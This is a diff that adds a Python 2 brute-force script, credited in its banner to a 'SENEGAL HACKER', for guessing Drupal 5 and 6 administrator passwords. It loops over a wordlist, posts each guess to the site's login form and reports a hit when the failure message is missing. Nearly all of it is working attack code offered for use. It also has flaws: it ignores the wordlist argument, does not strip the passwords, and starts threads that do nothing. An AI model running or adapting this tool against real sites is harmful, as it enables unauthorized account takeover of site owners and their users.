@@ -1,0 +1,54 @@
+#!/usr/bin/python
+import urllib2
+import urllib
+import re
+import sys
+import threading
+print("----------------------------------------------------------\n")
+print("******************Version 1 *****************************\n")
+print("############################################################\n")
+print("###########BRUTEFORCE DRUPAL CMS Version supporte 5&6####\n")
+print("###########SENEGAL HACKER writing by paco######\n")
+print("##########grousysteme01@gmail.com###########\n")
+print("##############################################\n")
+print("------------------------------------------------\n")
+print("--------------------------------------------------\n")
+usage="Usage:python Brutedrupal.py http://www.monsitedrupal.com  admin  dico.txt"
+if len(sys.argv)<2:
+    print usage
+    sys.exit()
+url=sys.argv[1]
+try:
+    user=sys.argv[2]
+    dico=sys.argv[3]
+except IndexError:
+      print(usage)
+      sys.exit()
+log= url+ "/?q=user"
+dico=open("dico.txt")
+for passwd in dico.readlines():
+    t=threading.Thread()
+    t.start()
+    passwd.strip()
+    print("Trying:",user,':',passwd)
+    data={
+       'name':user,
+       'pass':passwd,
+       'form_id':'user_login',
+       'op':'log in'
+          }
+    urldata=urllib.urlencode(data)
+    try:
+       result=urllib.urlopen(log,urldata).read()
+       m=re.search("Sorry",result)
+       if m==None:
+          print("utilisateur et pass trouver:",user,'=>',passwd)
+          sys.exit()
+       else:
+	   pass
+    except:
+	    print("Page Not found")
+	    sys.exit()
+
+
+     
